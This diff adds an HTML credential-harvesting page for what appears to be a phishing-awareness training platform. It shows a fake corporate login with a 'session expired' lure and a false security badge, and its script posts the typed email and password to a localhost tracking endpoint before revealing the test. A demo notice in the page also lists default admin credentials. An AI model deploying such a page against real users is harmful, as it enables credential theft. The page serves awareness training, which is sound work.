@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Corporativo - Acesso Seguro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            max-width: 450px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .form-container {
+            padding: 40px;
+        }
+
+        .alert {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #856404;
+        }
+
+        .alert strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 5px;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f5f5f5;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .security-badge::before {
+            content: "🔒";
+        }
+
+        .success-message {
+            display: none;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 5px;
+            padding: 20px;
+            text-align: center;
+            color: #155724;
+        }
+
+        .success-message h2 {
+            margin-bottom: 10px;
+            color: #155724;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🏢 Portal Corporativo</h1>
+            <p>Sistema de Gestão Empresarial</p>
+        </div>
+
+        <div class="form-container">
+            <div class="alert">
+                <strong>⚠️ Atenção!</strong>
+                Sua sessão expirou. Por favor, faça login novamente para acessar o sistema.
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">E-mail Corporativo</label>
+                    <input type="email" id="email" name="email" required placeholder="seu.nome@empresa.com">
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Senha</label>
+                    <input type="password" id="password" name="password" required placeholder="Digite sua senha">
+                </div>
+
+                <button type="submit" class="btn">Acessar Sistema</button>
+
+                <div class="security-badge">
+                    Conexão segura - SSL/TLS 256-bit
+                </div>
+            </form>
+
+            <div id="successMessage" class="success-message">
+                <h2>✅ Acesso Verificado!</h2>
+                <p>Redirecionando para o sistema...</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            © 2025 Portal Corporativo. Todos os direitos reservados.<br>
+            Departamento de TI - Suporte: ti@empresa.com
+        </div>
+    </div>
+
+    <script>
+        // Capturar o ID de tracking da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingId = urlParams.get('id');
+
+        console.log('🏢 [Corporativo] URL atual:', window.location.href);
+        console.log('🏢 [Corporativo] Tracking ID:', trackingId);
+
+        // Se não houver ID, mostrar mensagem informativa
+        if (!trackingId) {
+            console.log('🏢 [Corporativo] Sem ID de tracking - mostrando mensagem demo');
+            
+            const formElement = document.getElementById('loginForm');
+            const alertDiv = document.querySelector('.alert');
+            
+            if (alertDiv) alertDiv.style.display = 'none';
+            if (formElement) {
+                formElement.innerHTML = `
+                    <div style="background: #e3f2fd; border: 2px solid #2196f3; border-radius: 5px; padding: 20px; text-align: center;">
+                        <h3 style="color: #1976d2; margin-bottom: 10px;">ℹ️ Página de Demonstração</h3>
+                        <p style="margin-bottom: 15px;">Esta é uma página fake de phishing para fins educacionais.</p>
+                        <p style="font-size: 14px; color: #666;">
+                            Para usar esta página, você precisa acessá-la através de um link de campanha válido.<br>
+                            <strong>Envie uma campanha pelo painel admin para testar!</strong>
+                        </p>
+                        <p style="margin-top: 15px; font-size: 13px;">
+                            <strong>Como testar:</strong><br>
+                            1. Acesse <a href="http://localhost:5173" style="color: #2196f3;">http://localhost:5173</a><br>
+                            2. Login: admin@admin.com / admin123<br>
+                            3. Clique em "Enviar Agora" em uma campanha<br>
+                            4. Verifique seu email e clique no link
+                        </p>
+                    </div>
+                `;
+            }
+            return;
+        }
+
+        console.log('🏢 [Corporativo] ID de tracking encontrado:', trackingId);
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            console.log('🏢 [Corporativo] Enviando dados para tracking...');
+
+            try {
+                // Enviar dados para o backend
+                const response = await fetch(`http://localhost:3000/api/tracking/submit/${trackingId}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        username: email,
+                        password 
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Erro ao enviar dados');
+                }
+
+                const data = await response.json();
+                console.log('🏢 [Corporativo] Resposta recebida:', data);
+
+                // Mostrar mensagem de sucesso
+                const formElement = document.getElementById('loginForm');
+                const alertDiv = document.querySelector('.alert');
+                const successDiv = document.getElementById('successMessage');
+                
+                if (formElement) formElement.style.display = 'none';
+                if (alertDiv) alertDiv.style.display = 'none';
+                if (successDiv) successDiv.style.display = 'block';
+
+                // Simular redirecionamento
+                setTimeout(() => {
+                    alert('⚠️ ATENÇÃO: Este era um teste de phishing!\n\nVocê acabou de fornecer suas credenciais em um site falso.\n\nEm um ataque real, um criminoso teria acesso ao seu email e senha.\n\nDicas de segurança:\n✓ Sempre verifique a URL do site\n✓ Procure pelo cadeado de segurança\n✓ Nunca clique em links suspeitos\n✓ Use autenticação em dois fatores\n\nVerifique seu email para mais informações!');
+                    window.close();
+                }, 2000);
+            } catch (error) {
+                console.error('🏢 [Corporativo] Erro:', error);
+                alert('Erro ao processar. Por favor, tente novamente.');
+            }
+        });
+    </script>
+</body>
+</html>
